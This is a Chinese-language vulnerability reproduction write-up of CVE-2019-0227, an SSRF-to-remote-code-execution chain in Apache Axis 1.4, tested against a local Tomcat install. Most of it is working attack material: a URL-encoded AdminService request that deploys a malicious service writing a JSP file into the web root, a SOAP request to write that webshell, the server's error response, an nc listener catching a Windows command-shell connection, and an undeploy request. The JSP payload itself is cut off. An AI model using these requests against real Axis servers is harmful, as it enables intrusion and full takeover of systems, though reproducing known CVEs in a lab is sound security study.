## CVE-2019-0227

### 1. Axis简介 

Apache Axis是一个简单对象访问协议（SOAP）引擎，用来做webservice开发。使用Axis很简单，在apache官网上把axis下载后，直接部署在webapps目录下即可，启动tomcat,浏览器输入http://localhost:8080/axis即可。  

Apache Axis（1.4）是比较老的版本，现在较新的有Apache Axis2、Apache CXF和Metro等，尽管Axis 1.x已经过时，但是它仍在很多情况下被使用，例如使用Axis构造的项目难以重写或项目中包含使用SOAP编码的服务。  

### 2. 漏洞描述

在Apache Axis或Axis2中找到服务端请求伪造（SSRF）漏洞，就可能实现目标服务器的代码执行。 

漏洞利用的条件：  

1. 需要找到一个SSRF漏洞，通过SSRF漏洞,让目标服务器请求localhost服务（Axis以管理员权限处理localhost的请求，攻击者可以通过SSRF漏洞修改HTTP GET请求部分来伪装成localhost用户。）   
2. 目标服务器通过AdminService服务，创建新的恶意服务exploitservice（用来写文件） 
3. 访问exploitservice服务，使得在服务端写文件（恶意代码）
4. 访问目标服务器写入的jsp文件，执行恶意代码

### 3. 漏洞利用条件  
在Axis默认的示例中使用了过期的硬编码域名，在StockQuoteService.jws中我们能看到远程加载了XML：   
 
 doc = XMLUtils.newDocument( "http://www.xmltoday.com/examples/" +
                                "stockquote/getxmlquote.vep?s="+symbol );

可以发现该服务发送一个HTTP请求至www.xmltoday.com获取XML内容，进一步解析响应。  

漏洞发现者研究了XMLUtils.newDocument是如何进行重定向的，在Axis源码中的XMLutils部分，发现setInstanceFollowRedirects属性设置为ture。从而，我们确定了XMLUtils.newDocument函数将会遵循重定向流程。  

那么当支持重定向之后，就意味着可以重定向至localhost，那么需要考虑的是怎么拦截www.xmltoday.com的请求：   

1）DNS域名劫持，将www.xmltoday.com的请求，指向自己的恶意服务器，返回重定向请求  
2）局域网内进行ARP欺骗，拦截转发所有流量至攻击者服务器，筛选，重定向到某个进行构造的localhostURL 


### 4. 漏洞验证

在漏洞发现者给的漏洞验证脚本中，是利用arp欺骗完成的，需要利用kali linux上的很多工具，并且在搭建测试环境时，是在本机上运行Tomcat，所以此处验证就跳过ARP的欺骗。   

#### 1. 搭建Axis环境 

1）下载Axis 1.4版本：https://axis.apache.org/axis/java/releases.html  

2）现在bin版本，解压到Tomcat webapps目录下 

3）访问http://127.0.0.1:8080/axis/ ，显示成功
#### 2. 构造恶意重定向Localhost请求 

构造本地Localhost请求，访问AdminService，创建exploitservice，用于写文件：  

 	http://localhost:8080/axis/services/AdminService?	method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22exploitservice%22+provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler+type%3D%22RandomLog%22%2F%3E%3C%2FrequestFlow%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22java.util.Random%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3Chandler+name%3D%22RandomLog%22+type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22+%3E%3Cparameter+name%3D%22LogHandler.fileName%22+value%3D%22D%3A%5CProgram%20Files%5Cxampp%5Ctomcat%5Cwebapps%5Caxis%5Cexploit.jsp%22+%2F%3E%3Cparameter+name%3D%22LogHandler.writeToConsole%22+value%3D%22false%
 
#### 4. 访问exploitservice，写入shell.jsp  
 
 	POST /axis//services/exploitservice HTTP/1.1
 	Host: 127.0.0.1:8080
 	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
 	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 	Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 	Accept-Encoding: gzip, deflate
 	Connection: close
 	SOAPAction: something
 	Upgrade-Insecure-Requests: 1
 	Cookie: JSESSIONID=64C08F476670641E88336EED595AF855
 	Upgrade-Insecure-Requests: 1
 	Cache-Control: max-age=0
 	Content-Length: 2103
 
 	<?xml version="1.0" encoding="utf-8"?>
   	<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   	xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
   	xmlns:xsd="http://www.w3.org/2001/XMLSchema"
   	xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   	<soapenv:Body>
   	<api:main
   	soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
   	 <api:in0><![CDATA[
 	<%
 
响应显示：  
  
 	HTTP/1.1 500 Internal Server Error
 	Server: Apache-Coyote/1.1
 	Content-Type: text/xml;charset=utf-8
 	Date: Mon, 17 Jun 2019 08:35:31 GMT
 	Connection: close
 	Content-Length: 3252
 
 	<?xml version="1.0" encoding="UTF-8"?	><soapenv:Envelope xmlns:soapenv="http://	schemas.xmlsoap.org/soap/envelope/" 	xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><soapenv:Fault><faultcode xmlns:ns1="http://xml.apache.org/axis/">ns1:Client</faultcode><faultstring>No such operation 'main'</faultstring><detail><ns2:stackTrace xmlns:ns2="http://xml.apache.org/axis/">No such operation 'main'
  	at org.apache.axis.providers.java.RPCProvider.getOperationDesc(RPCProvider.java:312)
  	at org.apache.axis.providers.java.RPCProvider.processMessage(RPCProvider.java:88)
  	at org.apache.axis.providers.java.JavaProvider.invoke(JavaProvider.java:323)
  	at org.apache.axis.strategies.InvocationStrategy.visit(InvocationStrategy.java:32)
 	 at org.apache.axis.SimpleChain.doVisiting(SimpleChain.java:118)
  	at org.apache.axis.SimpleChain.invoke(SimpleChain.java:83)
  	at org.apache.axis.handlers.soap.SOAPService.invoke(SOAPService.java:454)
  	at org.apache.axis.server.AxisServer.invoke(AxisServer.java:281)
  	at org.apache.axis.transport.http.AxisServlet.doPost(AxisServlet.java:699)
  	at javax.servlet.http.HttpServlet.service(HttpServlet.java:646)
  	at org.apache.axis.transport.http.AxisServletBase.service(AxisServletBase.java:327)
  	at javax.servlet.http.HttpServlet.service(HttpServlet.java:727)
  	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)
  	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)

#### 5. 在本地通过nc监听8888端口，访问exploit.jsp触发执行

 	F:\常用工具\nc>nc -l -p 8888  

 	http://127.0.0.1:8080/axis/exploit.jsp
 
 
 	F:\常用工具\nc>nc -l -p 8888
 	Microsoft Windows [版本 6.1.7601]
 	版权所有 (c) 2009 Microsoft Corporation。保留所有权利。

#### 6. 关闭exploitservice 

 	http://localhost:8080/axis/services/AdminService?method=%21--%3E%3Cns1%3Aundeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22exploitservice%22%2F%3E%3C%2Fns1%3Aundeployment

### 参考链接

https://xz.aliyun.com/t/4768?from=timeline&isappinstalled=0  

https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2019-0227  

https://rhinosecuritylabs.com/application-security/cve-2019-0227-expired-domain-rce-apache-axis/
 
